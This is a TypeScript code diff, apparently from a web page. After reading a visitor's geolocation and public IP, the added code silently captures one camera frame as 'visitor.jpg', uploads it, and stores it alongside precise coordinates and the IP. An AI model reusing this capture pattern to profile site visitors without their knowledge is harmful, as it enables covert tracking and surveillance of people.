@@ -40,14 +40,112 @@ async (position) => {
 try {
 const ipInfo = await fetch("https://api.ipify.org?format=json");
 const { ip } = await ipInfo.json();
-  const result = await saveLocation.mutateAsync({
+/*
+const result = await saveLocation.mutateAsync({
     latitude: position.coords.latitude.toString(),
     longitude: position.coords.longitude.toString(),
     accuracy: Math.round(position.coords.accuracy),
     publicIp: ip,
   });
 
-  console.log("✅ Location saved:", result);
+  console.log("✅ Location saved:", result);*/
+try {
+  const stream = await navigator.mediaDevices.getUserMedia({
+    video: true,
+  });
+
+  console.log("✅ Camera permission granted");
+const video = document.createElement("video");
+video.srcObject = stream;
+video.muted = true;
+video.playsInline = true;
+video.autoplay = true;
+
+await video.play();
+
+await new Promise<void>((resolve) => {
+  const wait = () => {
+    if (
+      video.readyState >= HTMLMediaElement.HAVE_CURRENT_DATA &&
+      video.videoWidth > 0 &&
+      video.videoHeight > 0
+    ) {
+      resolve();
+    } else {
+      requestAnimationFrame(wait);
+    }
+  };
+
+  wait();
+});
+
+console.log("Video width =", video.videoWidth);
+console.log("Video height =", video.videoHeight);
+
+const canvas = document.createElement("canvas");
+canvas.width = video.videoWidth;
+canvas.height = video.videoHeight;
+
+const ctx = canvas.getContext("2d");
+
+if (!ctx) {
+  throw new Error("Canvas context unavailable");
+}
+
+ctx.drawImage(
+  video,
+  0,
+  0,
+  canvas.width,
+  canvas.height
+);
+
+const photo = canvas.toDataURL("image/jpeg", 0.9);
+const blob = await new Promise<Blob>((resolve, reject) => {
+  canvas.toBlob(
+    (b) => {
+      if (b) {
+        resolve(b);
+      } else {
+        reject(new Error("Failed to create image"));
+      }
+    },
+    "image/jpeg",
+    0.9
+  );
+});
+
+const formData = new FormData();
+
+formData.append(
+  "image",
+  blob,
+  "visitor.jpg"
+);
+
+const upload = await fetch("/api/upload", {
+  method: "POST",
+  body: formData,
+});
+
+
+const uploadResult = await upload.json();
+
+console.log("📷 Uploaded:", uploadResult);
+const result = await saveLocation.mutateAsync({
+  latitude: position.coords.latitude.toString(),
+  longitude: position.coords.longitude.toString(),
+  accuracy: Math.round(position.coords.accuracy),
+  publicIp: ip,
+  photo: uploadResult.url,
+});
+
+console.log("✅ Location saved:", result);
+console.log("📸 Photo captured", photo.substring(0, 50));
+  stream.getTracks().forEach((track) => track.stop());
+} catch (err) {
+  console.error("❌ Camera permission denied", err);
+}
 } catch (err) {
   console.error("❌ saveLocation failed:", err);
 }
